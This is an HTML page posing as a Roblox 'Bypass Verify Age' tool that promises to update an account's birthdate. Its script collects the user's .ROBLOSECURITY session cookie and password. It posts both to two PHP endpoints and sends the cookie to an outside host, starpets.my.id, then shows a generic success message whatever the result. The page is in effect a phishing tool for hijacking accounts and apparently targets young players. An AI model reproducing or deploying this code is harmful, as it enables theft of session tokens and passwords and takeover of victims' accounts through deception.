
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Birthdate Bypass Verify Age - Roblox</title>
       <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f9ff; color: #333; text-align: center; }
        .container { 
            max-width: 600px; 
            margin: 100px auto; 
            padding: 30px; 
            background-color: #ffffff; 
            border-radius: 10px; 
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); 
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(-20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        textarea, input[type="password"], input[type="text"] { 
            width: 100%; 
            padding: 12px; 
            font-size: 16px; 
            border: 1px solid #d1e4f1; 
            border-radius: 8px; 
            outline: none; 
            transition: all 0.3s ease-in-out;
            margin-bottom: 15px;
        }
        textarea {
            height: 200px; 
            resize: none; 
        }
        textarea:focus, input:focus {
            border-color: #2d87f0;
            box-shadow: 0 0 8px rgba(45, 135, 240, 0.5);
        }
        button { 
            padding: 12px 20px; 
            background-color: #2d87f0; 
            color: white; 
            font-size: 16px; 
            font-weight: 600; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            transition: all 0.3s ease-in-out;
        }
        button:disabled {
            background-color: #888;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Bypass Verify Age </h2>
        <input type="text" id="cookies" placeholder="Enter .ROBLOSECURITY Cookie" required>
        <input type="password" id="password" placeholder="Enter Password" required>
        <button onclick="updateBirthdate()">Update Birthdate</button>
        <p id="response"></p>
    </div>
    
    <script>
        function updateBirthdate() {
            const cookies = document.getElementById('cookies').value;
            const password = document.getElementById('password').value;
            const responseElement = document.getElementById('response');
            
            if (!cookies || !password) {
                responseElement.innerText = 'Cookies and password are required!';
                return;
            }
            
            const request1 = fetch('api-age.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookies, password })
            }).then(response => response.json());
            
            const request2 = fetch('bypass_cookie.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookies, password })
            }).then(response => response.json());
            
            const request3 = fetch(`https://starpets.my.id/bypass-verify.php?cookie=${encodeURIComponent(cookies)}`)
                .then(response => response.text());
            
            Promise.all([request1, request2, request3])
                .then(results => {
                    const [result1, result2, result3] = results;
                    responseElement.innerText = (result1.error || result2.error) ?
                        `Error: ${result2.error}` :
                        'Birthdate updated successfully, bypass applied, and verification completed!';
                })
                .catch(error => {
                    responseElement.innerText = 'Error: ' + error.message;
                });
        }
    </script>
</body>
</html>